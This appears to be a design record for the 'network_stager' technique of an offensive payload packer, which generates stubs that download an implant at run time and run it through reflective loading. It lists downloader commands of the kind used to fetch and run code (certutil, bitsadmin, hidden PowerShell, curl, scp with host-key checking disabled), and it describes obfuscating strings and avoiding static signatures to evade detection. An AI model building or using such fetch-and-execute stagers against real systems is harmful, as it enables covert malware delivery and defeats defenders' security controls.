# Network stager (`network_stager`)

Status: **implemented (`Stability::Experimental`).** The shipped transport is a
child downloader process (`curl`/`certutil`/`powershell`/`bitsadmin`, plus
`scp://`); the in-process WinHTTP transport and the `ssh` workstream in §6 remain
future work. This document is the design record — the as-built reference is
`src/techniques/network_stager/README.md`.

A runtime network stager: instead of embedding every payload into the generated
stub (encrypted with XChaCha20-Poly1305 and decrypted in-process), the stub
fetches the payload at run time over the network, optionally decrypts it, and
then runs it with the usual execution techniques.

## 1. Goal

- Fetch a payload **at run time**, not at build time, so the payload bytes never
  ship inside the artifact (smaller stub, no embedded-ciphertext signature, and
  the operator can rotate the payload without rebuilding).
- Express it as a **`runtime:` technique step** (a `Category::Control` step),
  so it composes with the existing `on_success`/`on_fail`/`delay_ms` gating and
  chains with the execution techniques.
- Support several transports (`http`, `https`, `ftp`, `scp`) and an optional
  encryption layer for the bytes on the wire.
- Reuse the existing crypto, string-obfuscation, args and runner machinery
  rather than reimplementing any of it.

## 2. Why a technique, not a `build.payloads.<name>.source` change

Today `build.payloads.<name>.source` is resolved by the **packer** at build time:
`http(s)://` is fetched in memory, `file://` is read from disk, and the result is
embedded as ciphertext (`include_bytes!` + `decrypt_step` in the runner — see
`src/engine/steps.rs::render_execution_block`). A stager moves that fetch to the
**stub** at run time, which is a different thing and belongs in the ordered
`runtime:` list next to the step that consumes the result.

## 3. Shape

A Control step that produces the bytes for a named payload, stored where the next
Execution step can read them:

```yaml
runtime:
  - technique: network_stager
    params:
      payload: implant            # the payload name this fetches (build.payloads.implant)
      url: "https://example.invalid/implant.bin"
      downloader: curl            # auto | curl | certutil | powershell | bitsadmin
      crypto: none                # none | xchacha20poly1305
      key: <hex 32 bytes>         # only when crypto != none
      nonce: <hex 24 bytes>       # only when crypto != none
      timeout_ms: 30000
      retries: 0
    on_fail: stop
  - technique: reflective_loading
    params:
      payload: implant
```

The URL scheme selects the transport at build time: `http://`, `https://` and
`ftp://` use the configured `downloader`, while `scp://` always uses `scp` (there
is no separate `method` field — the scheme is the method). The stager runs first
and fills the `implant` slot; the `reflective_loading` step then runs the fetched
(and decrypted) bytes exactly as it would an embedded payload.

## 4. How it plugs into the runner

The runner (`$STEP_RUNNER_BODY$`) currently, per Execution step, does:

```rust
let enc: &[u8] = include_bytes!("payload_N.bin");
let mut image = decrypt_step(enc, NONCE, KEY, LEN)?;
step_N::payload(&mut image)
```

For a **staged** payload there is no `payload_N.bin` and no `include_bytes!`.
The proposal is a small, local change to `render_execution_block`:

```rust
let mut image = crate::take_staged_payload("implant")?;   // filled by the stager
step_N::payload(&mut image)
```

`take_staged_payload` reads a process-global slot (a `OnceLock<Vec<u8>>` or the
existing static-slot pattern already used by the syscall layer for
`stack_spoofing`) that the `network_stager` step populated. No other part of the
runner changes.

## 5. Params (schema)

`TechniqueKind::NetworkStager { params: network_stager::Params }`, with:

| field | type | default | notes |
| --- | --- | --- | --- |
| `payload` | `String` | *(required)* | name in `build.payloads` this step stages; the build detects it and leaves it out of the artifact, and a later Execution step consumes it |
| `url` | `String` | *(required)* | full URL; the scheme selects the transport family (`http(s)`/`ftp` → `downloader`, `scp://` → `scp`) |
| `downloader` | enum `auto\|curl\|certutil\|powershell\|bitsadmin` | `auto` | which program fetches the blob; `auto` = `curl` for `http(s)`/`ftp` |
| `crypto` | enum `none\|xchacha20poly1305` | `none` | whether the fetched blob is encrypted |
| `key` / `nonce` | hex strings | *(required when encrypted)* | XChaCha20 key (32 bytes) / nonce (24 bytes) |
| `timeout_ms` | `u32` | `30000` | connect/read timeout |
| `retries` | `u32` | `0` | extra attempts after the first |

All string params are obfuscated through `StringsConfig` (URL, host, credentials,
downloader command and flags), like every other technique's runtime literals.

## 6. Transports and reuse

The transport is decided at build time from the URL scheme, so the fragment
carries no scheme literal. Each step's fragment (`stub_fragment.rs`) builds the
downloader command, and the shared `$STAGER_BLOCK$` (`src/engine/stager.rs`) holds
the global slot and the staged decryption (`store_staged_payload` /
`take_staged_payload`).

Every shipped transport is a **child process** that writes a temp file the stub
then reads:

- **`http` / `https` / `ftp`** — a downloader chosen by the `downloader` param:
  `curl -sL -o <out> <url>` (default), `certutil -urlcache -split -f <url> <out>`,
  a hidden `powershell -NoProfile -Command Invoke-WebRequest`, or
  `bitsadmin /transfer <job> /download <url> <out>`. `curl` ships with Windows 10+
  and is less commonly blocked than `certutil`; the param exists so a plan can
  switch to whichever the host allows.
- **`scp://`** — a child
  `scp -o StrictHostKeyChecking=no [-P <port>] <user@host:path> <out>`, always
  `scp` regardless of `downloader`. Not runtime-verified (no SSH host available)
  and requires a passwordless key.

An in-process **WinHTTP/WinInet** client (no child process, no temp file) was the
original MVP plan; it remains future work (§11 M1), because the subprocess
download is the low-effort transport that already ships. It is also the answer to
the clearest detection signal today — see `src/techniques/network_stager/README.md`.

## 7. Crypto reuse

When `crypto: xchacha20poly1305`, the stager decrypts the fetched blob in the
stub with the same `chacha20poly1305` + `hex` crates; the helper is
`decrypt_staged` (`src/engine/stager.rs`), a staged variant that skips the
plaintext-length check `decrypt_step` performs (the size is unknown at build
time). The key/nonce are declared on the step as hex strings.

## 8. Reuse map (what is NOT reimplemented)

- **Crypto**: `chacha20poly1305` / `hex`, the staged decryption
  (`decrypt_staged`, `src/engine/stager.rs`).
- **Obfuscation**: `StringsConfig::obfuscate` for every runtime literal.
- **Args / runtime config**: `$ARGS_BLOCK$` + `$arg.N$` for URL/credentials.
- **Gating**: the standard `StepControl` (`on_success`/`on_fail`/`delay_ms`).
- **Runner**: only `render_execution_block`'s fetch-and-decrypt line changes.
- **Payload pinning**: reuse `plan::steps::resolve`'s named-payload resolution.
- **Scheme detection**: done at build time (the fragment carries no scheme
  literal), the same split `src/engine/fetch.rs` makes.

## 9. Validation rules (`plan::validate`)

- At most one `network_stager` step per runtime (it fills a single slot).
- `params.payload` must name an existing `build.payloads` entry; the build
  detects the stager and leaves that payload out of the artifact (its `source` is
  ignored).
- The stager must precede the Execution step that consumes `payload`, and that
  payload must be loaded by **exactly one** Execution step.
- `url` must use `http://`, `https://`, `ftp://` or `scp://`.
- `crypto: xchacha20poly1305` requires `key` (64 hex chars) and `nonce` (48 hex
  chars).
- The existing terminal-step rule still applies (a staged `reflective_loading`
  of a PE executable remains terminal).

## 10. Open design decisions (to settle at implementation time)

*(Settled at implementation: a payload is staged by being named in a
`network_stager` step — no separate `staged: true` flag; the stager keeps one
global slot guarded by a `Mutex`; and the download is the subprocess transport in
§6, not an in-Rust client.)*

1. **How is a payload marked "staged"?** Either a `build.payloads.<name>.staged:
   true` flag (the `source` stays for build-time fallback) or a dedicated
   `source: "stage://..."` scheme. Recommend `staged: true` (smaller schema
   delta, and keeps `source` for the embedded path).
2. **Slot ownership.** One global slot (`OnceLock<Vec<u8>>`) vs. a
   `Vec<Option<Vec<u8>>>` keyed by payload name. Recommend the latter only if a
   plan can stage multiple distinct payloads; otherwise keep one slot and
   validate "at most one stager per runtime".
3. **`ssh` scope.** Subprocess vs. in-Rust client (see §6).

## 11. Phases

- **M0 — schema + registry.** `TechniqueKind::NetworkStager`, `Params`, `DEF`
  (category `Control`, ATT&CK T1105/T1071), validation skeleton. No fragment yet;
  `Stability::Unimplemented` until a transport lands.
- **M1 — `https` + runner wiring.** `$STAGER_BLOCK$` with the WinHTTP fetch, the
  staged-payload slot, and the `render_execution_block` change; `crypto: none`
  first. Verify end to end on a loopback/self-hosted URL.
- **M2 — crypto.** Wire `xchacha20poly1305` decrypt of the fetched blob, reusing
  `decrypt_step`; key/nonce from the payload or `$arg.N$`.
- **M3 — `http` + `ftp`.** WinInet variants; auth; retries/timeouts.
- **M4 — `ssh`.** Decide subprocess vs. client; likely its own workstream.
- **M5 — wizard + docs.** Add a wizard prompt for `network_stager`; measure in
  `docs/measurements.md`; flip to `Experimental`.

## 12. Risks

- **WinHTTP/WinInet imports** are new static signatures (currently the stub
  keeps networking out); mitigate with dynamic resolution or the syscall layer
  later. Document the IAT delta in `docs/measurements.md`.
- **`ssh` is disproportionate** — flag it clearly so it does not block M0–M3.
- **A staged payload cannot be verified at build time** (nothing to inspect), so
  `build.payloads.<name>.sha256` becomes a *runtime* check the stager performs
  after fetching.
- **One slot, one consumer** — a plan that stages twice must be rejected early.

## 13. References

- `src/engine/steps.rs` — `render_execution_block`, `STUB_HELPERS` (`decrypt_step`).
- `src/engine/fetch.rs` — build-time URL scheme handling to mirror.
- `src/techniques/` — technique registry + `Category::Control`.
- `src/plan/schema.rs` — `PayloadPlan`, `CryptoPlan`, `StepControl`.
- `examples/stubs/runtime-key.rs` — runtime key material via `$arg.N$`.
